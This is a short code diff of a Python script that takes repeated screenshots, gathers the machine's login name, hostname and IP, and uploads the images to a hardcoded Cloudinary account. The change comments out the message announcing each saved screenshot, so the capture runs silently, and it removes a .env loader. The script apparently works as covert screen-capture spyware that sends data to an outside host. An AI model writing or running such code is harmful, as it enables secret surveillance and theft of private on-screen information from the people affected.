@@ -3,21 +3,11 @@ import pyautogui
 from cloudinary import config
 from cloudinary.uploader import upload
 from datetime import datetime
-from os import path, environ, getlogin, makedirs, remove
+from os import path, getlogin, makedirs, remove
 from platform import node, system
-from time import sleep
 from socket import gethostbyname, gethostname
+from time import sleep
 
-
-def load_env():
-    if path.exists(".env"):
-        with open(".env") as f:
-            for line in f:
-                key, value = line.strip().split("=", 1)
-                environ[key] = value
-
-
-load_env()
 
 config(
     cloud_name="dsnwguzkd",
@@ -67,8 +57,7 @@ def take_screenshot():
         screenshot.save(filepath)
 
         upload_to_cloudinary(filepath)
-
-        print(f"Screenshot guardada: {filepath}")
+        # print(f"Screenshot guardada: {filepath}")
 
         sleep(INTERVAL)
 
